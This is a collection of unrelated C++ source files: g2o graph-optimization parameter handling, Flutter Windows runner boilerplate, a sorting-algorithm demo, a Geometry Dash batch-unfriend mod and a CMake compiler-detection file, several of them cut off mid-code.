    "// g2o - General Graph Optimization\n// Copyright (C) 2011 R. Kuemmerle, G. Grisetti, W. Burgard\n// All rights reserved.\n//\n// Redistribution and use in source and binary forms, with or without\n// modification, are permitted provided that the following conditions are\n// met:\n//\n// * Redistributions of source code must retain the above copyright notice,\n//   this list of conditions and the following disclaimer.\n// * Redistributions in binary form must reproduce the above copyright\n//   notice, this list of conditions and the following disclaimer in the\n//   documentation and/or other materials provided with the distribution.\n//\n// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS\n// IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED\n// TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A\n// PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT\n// HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,\n// SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED\n// TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR\n// PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF\n// LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING\n// NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS\n// SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n\n#include \"parameter_container.h\"\n\n#include <iostream>\n\n#include \"factory.h\"\n#include \"parameter.h\"\n\n#include \"../stuff/macros.h\"\n#include \"../stuff/color_macros.h\"\n#include \"../stuff/string_tools.h\"\n\nnamespace g2o {\n\n  using namespace std;\n\n  ParameterContainer::ParameterContainer(bool isMainStorage_) :\n    _isMainStorage(isMainStorage_)\n  {\n  }\n\n  void ParameterContainer::clear() {\n    if (!_isMainStorage)\n      return;\n    for (iterator it = begin(); it!=end(); it++){\n      delete it->second;\n    }\n    BaseClass::clear();\n  }\n\n  ParameterContainer::~ParameterContainer(){\n    clear();\n  }\n\n  bool ParameterContainer::addParameter(Parameter* p){\n    if (p->id()<0)\n      return false;\n    iterator it=find(p->id());\n    if (it!=end())\n      return false;\n    insert(make_pair(p->id(), p));\n    return true;\n  }\n\n  Parameter* ParameterContainer::getParameter(int id) {\n    iterator it=find(id);\n    if (it==end())\n      return 0;\n    return it->second;\n  }\n\n  Parameter* ParameterContainer::detachParameter(int id){\n    iterator it=find(id);\n    if (it==end())\n      return 0;\n    Parameter* p=it->second;\n    erase(it);\n    return p;\n  }\n  \n  bool ParameterContainer::write(std::ostream& os) const{\n    Factory* factory = Factory::instance();\n    for (const_iterator it=begin(); it!=end(); it++){\n      os << factory->tag(it->second) << \" \";\n      os << it->second->id() << \" \";\n      it->second->write(os);\n      os << endl;\n    }\n    return true;\n  }\n\n  bool ParameterContainer::read(std::istream& is, const std::map<std::string, std::string>* _renamedTypesLookup){\n    stringstream currentLine;\n    string token;\n\n    Factory* factory = Factory::instance();\n    HyperGraph::GraphElemBitset elemBitset;\n    elemBitset[HyperGraph::HGET_PARAMETER] = 1;\n    \n    while (1) {\n      int bytesRead = readLine(is, currentLine);\n      if (bytesRead == -1)\n        break;\n      currentLine >> token;\n      if (bytesRead == 0 || token.size() == 0 || token[0] == '#')\n        continue;\n      if (_renamedTypesLookup && _renamedTypesLookup->size()>0){\n\tmap<string, string>::const_iterator foundIt = _renamedTypesLookup->find(token);\n\tif (foundIt != _renamedTypesLookup->end()) {\n\t  token = foundIt->second;\n\t}\n      }\n\n      HyperGraph::HyperGraphElement* element = factory->construct(token, elemBitset);\n      if (! element) // not a parameter or otherwise unknown tag\n        continue;\n      assert(element->elementType() == HyperGraph::HGET_PARAMETER && \"Should be a param\");\n\n      Parameter* p = static_cast<Parameter*>(element);\n      int pid;\n      currentLine >> pid;\n      p->setId(pid);\n      bool r = p->read(currentLine);\n      if (! r) {\n        cerr << __PRETTY_FUNCTION__ << \": Error reading data \" << token << \" for parameter \" << pid << endl;\n        delete p;\n      } else {\n        if (! addParameter(p) ){\n          cerr << __PRETTY_FUNCTION__ << \": Parameter of type:\" << token << \" id:\" << pid << \" already defined\" << endl;\n        }\n      }\n    } // while read line\n    \n    return true;\n  }\n  \n} // end namespace\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "//#include <iostream>\n//#include <cstdlib>\n//#include <ctime>\n//#include <fstream>\n//using namespace std;\n//const int x = 1, y = 1000;  //\u968f\u673a\u751f\u6210\u533a\u95f4[x,y]\u4e4b\u95f4\u7684\u6570\n//const int m = 100, n = 30;//m\u4e3a\u521d\u59cb\u5316\u6570\u91cf\uff0cn\u4e3a\u64cd\u4f5c\u6570\u91cf,\u5206\u5341\u6b21\u751f\u6210\u968f\u673a\u6570\u548c\u968f\u673a\u64cd\u4f5c\n//int op,temp;\n//int main()\n//{\n//\tsrand((unsigned)time(NULL)*10);\n//\n//\tofstream fout1, fout2;\n//\tfout1.open(\"d:\\\\codefile\\\\vs\\\\ex3\u6570\u636e\u7ed3\u6784\u7b97\u6cd5\u8bbe\u8ba1\u5b9e\u9a8c\\\\input1.txt\", ios::app | ios::out);\n//\tfout2.open(\"d:\\\\codefile\\\\vs\\\\ex3\u6570\u636e\u7ed3\u6784\u7b97\u6cd5\u8bbe\u8ba1\u5b9e\u9a8c\\\\input.txt\", ios::app | ios::out);\n//\tif (!fout1.is_open() || !fout2.is_open()) { cout << \"error\" << endl; }\n//\n//\tfor (int i = 0; i < m; i++)//\u751f\u6210m\u4e2a\u968f\u673a\u6570\u7528\u4e8e\u521d\u59cb\u5316\u8df3\u8868\n//\t{\n//\t\tfout1 << ((rand() % (y - x + 1)) + x) << '\\n';//\u53d6\u5f97[x,y]\u533a\u95f4\u5185\u968f\u673a\u6570\n//\t}\n//\tfor (int i = 0; i < n; i++) \n//\t{\n//\t\tif (i < (n / 3)) {//\u751f\u6210\u63d2\u5165\u64cd\u4f5c2\n//\t\t\top = 2;\n//\t\t\ttemp = (rand() % (y - x + 1)) + x;//\u751f\u6210\u968f\u673a\u6570\n//\t\t\tfout2 << op << \" \" << temp << '\\n';\n//\t\t}\n//\t\telse if (i >= (n / 3) && i < (2 * n / 3)) {//\u751f\u6210\u5220\u9664\u64cd\u4f5c3,4,5\n//\t\t\top = (rand() % (5 - 3 + 1)) + 3;\n//\t\t\tif (op == 3) {//\u751f\u6210\u5220\u9664\u64cd\u4f5c3\n//\t\t\t\ttemp = (rand() % (y - x + 1)) + x;//\u751f\u6210\u968f\u673a\u6570\n//\t\t\t\tfout2 << op << \" \" << temp << '\\n';\n//\t\t\t}\n//\t\t\telse if (op == 4 || op == 5) fout2 << op << '\\n';//\u751f\u6210\u5220\u9664\u6700\u5927\u503c\u6216\u6700\u5c0f\u503c\u64cd\u4f5c4,5\n//\t\t}\n//\t\telse {//\u751f\u6210\u67e5\u627e\u64cd\u4f5c1\n//\t\t\top = 1;\n//\t\t\ttemp = (rand() % (y - x + 1)) + x;//\u751f\u6210\u968f\u673a\u6570\n//\t\t\tfout2 << op << \" \" << temp << '\\n';\n//\t\t}\n//\t}\n//\tcout << \"\u6210\u529f\u751f\u6210\u968f\u673a\u6570\u548c\u968f\u673a\u64cd\u4f5c\" << endl;\n//\tfout1.close();\n//\tfout2.close();\n//\treturn 0;\n//}",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "// TODO: Refactor this code to be more readable and maintainable\n\n#include <Geode/Geode.hpp>\n\nusing namespace geode::prelude;\n\n#define TAG_CONFIRM_UNFRIEND 0x21\n#define TAG_CONFIRM_UNBLOCK 0x22\n\n#include <Geode/modify/FriendsProfilePage.hpp>\n#include <Geode/modify/GJUserCell.hpp>\n\nstruct UserData {\n    int32_t m_accountID;\n    CCMenuItemToggler *m_checkbox;\n\n    std::string m_username;\n};\n\nstatic UserListType g_userListType;\nstatic std::vector<UserData> g_userData;\nstatic CCMenuItemToggler *g_selectAll;\nstatic std::function<void(UserListType)> g_batchRemoveAlertHandlerCallback = nullptr;\n\nvoid updateSelectAllCheckbox() {\n    if (!g_selectAll) return;\n\n    bool allSelected = true;\n    for (auto &userData: g_userData) {\n        bool isCheckboxOn = userData.m_checkbox->isOn();\n        if (!isCheckboxOn) {\n            allSelected = false;\n            break;\n        }\n    }\n\n    g_selectAll->toggle(allSelected);\n}\n\nclass BatchRemoveAlertHandler : public FLAlertLayerProtocol {\n    void FLAlert_Clicked(FLAlertLayer *modal, bool btn2) override {\n        if (btn2) {\n            auto tag = modal->getTag();\n            if (tag == TAG_CONFIRM_UNFRIEND) {\n                // show alert\n                if (g_batchRemoveAlertHandlerCallback)\n                    g_batchRemoveAlertHandlerCallback(UserListType::Friends);\n\n                g_batchRemoveAlertHandlerCallback = nullptr;\n            } else if (tag == TAG_CONFIRM_UNBLOCK) {\n                // show alert\n                if (g_batchRemoveAlertHandlerCallback)\n                    g_batchRemoveAlertHandlerCallback(UserListType::Blocked);\n\n                g_batchRemoveAlertHandlerCallback = nullptr;\n            }\n        }\n    }\n};\n\nstatic BatchRemoveAlertHandler g_batchRemoveAlertHandler;\n\nclass $modify(FriendsListExt, FriendsProfilePage) {\n    bool init(UserListType type) {\n        if (!FriendsProfilePage::init(type)) return false;\n\n        g_userListType = type;\n\n        auto myButton = CCMenuItemSpriteExtra::create(\n                CCSprite::createWithSpriteFrameName(\n                        type == UserListType::Friends ? \"accountBtn_removeFriend_001.png\" : \"GJ_trashBtn_001.png\"),\n                this, menu_selector(FriendsListExt::onBatchRemove)\n        );\n        myButton->setPosition({0, -269.f});\n        myButton->setID(\"batchremover-delete-btn\");\n\n        g_selectAll = CCMenuItemToggler::createWithStandardSprites(this, menu_selector(FriendsListExt::onSelectAll),\n                                                                   0.7f);\n        g_selectAll->setPosition({40, -258.f});\n        g_selectAll->setID(\"batchremover-select-all\");\n\n        auto *mainLayer = getChildOfType<CCLayer>(this, 0);\n        auto *menu = getChildOfType<CCMenu>(mainLayer, 0);\n        menu->addChild(myButton);\n        menu->addChild(g_selectAll);\n\n        // Add \"All\" label\n        auto allLabel = CCLabelBMFont::create(\"All\", \"goldFont.fnt\");\n        allLabel->setScale(0.55f);\n        allLabel->setPosition({69.f, -257.f});\n        allLabel->setID(\"batchremover-all-label\");\n        menu->addChild(allLabel);\n\n        return true;\n    }\n\n    void getUserListFinished(cocos2d::CCArray *arr, UserListType type) {\n        g_userData.clear();\n        FriendsProfilePage::getUserListFinished(arr, type);\n    }\n\n    void onBatchRemove(CCObject *) {\n        // log selected users\n        std::vector<UserData> selectedUsers;\n        for (auto &userData: g_userData) {\n            if (userData.m_checkbox->isOn()) {\n                selectedUsers.push_back(userData);\n            }\n        }\n\n        if (selectedUsers.empty()) {\n            FLAlertLayer::create(\n                    this, \"Nothing here...\",\n                    fmt::format(\"You <cr>have not selected</c> any users to <cy>{}</c>.\",\n                                g_userListType == UserListType::Friends ? \"unfriend\" : \"unblock\").c_str(),\n                    \"OK\", nullptr\n            )->show();\n            return;\n        }\n\n        FLAlertLayer *modal;\n        if (g_userListType == UserListType::Friends) {\n            modal = FLAlertLayer::create(\n                    &g_batchRemoveAlertHandler, \"Unfriend\",\n                    fmt::format(\n                            \"Are you sure you want to <cy>unfriend</c> {} user{}?\",\n                            selectedUsers.size(), selectedUsers.size() > 1 ? \"s\" : \"\"),\n                    \"Back\", \"Unfriend\"\n            );\n            modal->setTag(TAG_CONFIRM_UNFRIEND);\n            modal->m_button2->updateBGImage(\"GJ_button_06.png\");\n        } else {\n            modal = FLAlertLayer::create(\n                    &g_batchRemoveAlertHandler, \"Unblock\",\n                    fmt::format(\"Are you sure you want to <cy>unblock</c> {} user{}?\",\n                                selectedUsers.size(), selectedUsers.size() > 1 ? \"s\" : \"\"),\n                    \"Back\", \"Unblock\"\n            );\n            modal->setTag(TAG_CONFIRM_UNBLOCK);\n            modal->m_button2->updateBGImage(\"GJ_button_05.png\");\n        }\n\n      ",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\n#include <vector>\n\n// Bubble Sort\nvoid bubbleSort(std::vector<int>& arr) {\n    int n = arr.size();\n    for (int i = 0; i < n-1; ++i) {\n        for (int j = 0; j < n-i-1; ++j) {\n            if (arr[j] > arr[j+1]) {\n                std::swap(arr[j], arr[j+1]);\n            }\n        }\n    }\n}\n\n// Selection Sort\nvoid selectionSort(std::vector<int>& arr) {\n    int n = arr.size();\n    for (int i = 0; i < n-1; ++i) {\n        int min_idx = i;\n        for (int j = i+1; j < n; ++j) {\n            if (arr[j] < arr[min_idx]) {\n                min_idx = j;\n            }\n        }\n        std::swap(arr[i], arr[min_idx]);\n    }\n}\n\n// Insertion Sort\nvoid insertionSort(std::vector<int>& arr) {\n    int n = arr.size();\n    for (int i = 1; i < n; ++i) {\n        int key = arr[i];\n        int j = i - 1;\n        while (j >= 0 && arr[j] > key) {\n            arr[j+1] = arr[j];\n            --j;\n        }\n        arr[j+1] = key;\n    }\n}\n\n// Merge Sort\nvoid merge(std::vector<int>& arr, int l, int m, int r) {\n    int n1 = m - l + 1;\n    int n2 = r - m;\n\n    std::vector<int> L(n1), R(n2);\n\n    for (int i = 0; i < n1; ++i)\n        L[i] = arr[l + i];\n    for (int j = 0; j < n2; ++j)\n        R[j] = arr[m + 1 + j];\n\n    int i = 0, j = 0, k = l;\n    while (i < n1 && j < n2) {\n        if (L[i] <= R[j]) {\n            arr[k] = L[i];\n            ++i;\n        } else {\n            arr[k] = R[j];\n            ++j;\n        }\n        ++k;\n    }\n\n    while (i < n1) {\n        arr[k] = L[i];\n        ++i;\n        ++k;\n    }\n\n    while (j < n2) {\n        arr[k] = R[j];\n        ++j;\n        ++k;\n    }\n}\n\nvoid mergeSort(std::vector<int>& arr, int l, int r) {\n    if (l < r) {\n        int m = l + (r - l) / 2;\n\n        mergeSort(arr, l, m);\n        mergeSort(arr, m + 1, r);\n\n        merge(arr, l, m, r);\n    }\n}\n\n// Quick Sort\nint partition(std::vector<int>& arr, int low, int high) {\n    int pivot = arr[high];\n    int i = low - 1;\n\n    for (int j = low; j < high; ++j) {\n        if (arr[j] < pivot) {\n            ++i;\n            std::swap(arr[i], arr[j]);\n        }\n    }\n    std::swap(arr[i + 1], arr[high]);\n    return i + 1;\n}\n\nvoid quickSort(std::vector<int>& arr, int low, int high) {\n    if (low < high) {\n        int pi = partition(arr, low, high);\n\n        quickSort(arr, low, pi - 1);\n        quickSort(arr, pi + 1, high);\n    }\n}\n\n// Heap Sort\nvoid heapify(std::vector<int>& arr, int n, int i) {\n    int largest = i;\n    int l = 2*i + 1;\n    int r = 2*i + 2;\n\n    if (l < n && arr[l] > arr[largest])\n        largest = l;\n\n    if (r < n && arr[r] > arr[largest])\n        largest = r;\n\n    if (largest != i) {\n        std::swap(arr[i], arr[largest]);\n        heapify(arr, n, largest);\n    }\n}\n\nvoid heapSort(std::vector<int>& arr) {\n    int n = arr.size();\n\n    for (int i = n / 2 - 1; i >= 0; --i)\n        heapify(arr, n, i);\n\n    for (int i = n-1; i > 0; --i) {\n        std::swap(arr[0], arr[i]);\n        heapify(arr, i, 0);\n    }\n}\n\n// Utility function to print an array\nvoid printArray(const std::vector<int>& arr) {\n    for (int num : arr) {\n        std::cout << num << \" \";\n    }\n    std::cout << std::endl;\n}\n\nint main() {\n    std::vector<int> arr = {64, 25, 12, 22, 11};\n    std::cout << \"Original Array: \";\n    printArray(arr);\n\n    // Bubble Sort\n    bubbleSort(arr);\n    std::cout << \"After Bubble Sort: \";\n    printArray(arr);\n\n    // Selection Sort\n    selectionSort(arr);\n    std::cout << \"After Selection Sort: \";\n    printArray(arr);\n\n    // Insertion Sort\n    insertionSort(arr);\n    std::cout << \"After Insertion Sort: \";\n    printArray(arr);\n\n    // Merge Sort\n    mergeSort(arr, 0, arr.size()-1);\n    std::cout << \"After Merge Sort: \";\n    printArray(arr);\n\n    // Quick Sort\n    quickSort(arr, 0, arr.size()-1);\n    std::cout << \"After Quick Sort: \";\n    printArray(arr);\n\n    // Heap Sort\n    heapSort(arr);\n    std::cout << \"After Heap Sort: \";\n    printArray(arr);\n\n    return 0;\n}\n",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP */\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n# if defined(__INTEL_COMPILER_UPDATE)\n#  define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n# else\n#  define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n  /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif 